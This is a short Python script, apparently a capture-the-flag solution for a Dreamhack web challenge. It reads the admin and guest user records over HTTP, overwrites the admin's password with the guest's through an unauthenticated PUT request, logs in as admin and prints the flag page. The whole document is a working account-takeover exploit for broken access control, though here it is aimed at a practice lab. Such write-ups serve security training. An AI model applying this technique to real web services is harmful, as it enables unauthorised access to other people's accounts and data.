import requests

url = 'http://host3.dreamhack.games:17287'

admin_data = requests.get(f'{url}/user/admin.json').json()
guest_data = requests.get(f'{url}/user/guest.json').json()

# Change admin's password to guest's password
admin_data['password'] = guest_data.get('password')

res = requests.put(f'{url}/user/admin.json', json=admin_data)

if res.status_code == 204:
    sess = requests.Session()
    res = sess.post(f'{url}/login.php', data={'username': 'admin', 'password': 'guest'})
    if res.status_code == 200:
        res = sess.get(f'{url}/flag.php')
        print(res.text)